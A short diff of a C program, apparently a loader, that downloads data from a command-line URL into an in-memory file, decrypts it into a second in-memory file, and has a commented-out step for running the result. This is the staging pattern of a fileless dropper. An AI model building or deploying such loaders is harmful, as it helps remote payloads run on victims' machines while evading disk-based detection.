@@ -23,9 +23,7 @@ size_t write_callback(void* data, size_t size, size_t nmemb, void* userp) {
   return written;
 }
 
-int download_to_fd(char* url) {
-  int fd = create_mem_fd();
-
+int download_to_fd(int fd, char* url) {
   CURL* curl = curl_easy_init();
   ERROR_IF(curl == NULL, "[!] Cannot create CURL object");
 
@@ -71,8 +69,11 @@ int main(int argc, char* argv[]) {
     return -1;
   }
 
-  int download_fd    = download_to_fd(argv[1]);
-  int decrypted_file = crypto_fd(download_fd, false);
+  int download_fd  = create_mem_fd();
+  int decrypted_fd = create_mem_fd();
+
+  download_to_fd(download_fd, argv[1]);
+  crypto_fd(download_fd, decrypted_fd, false);
 
   /*char* download_path  = fd_to_path(download_fd);
   char* running_argv[] = {download_path, NULL};
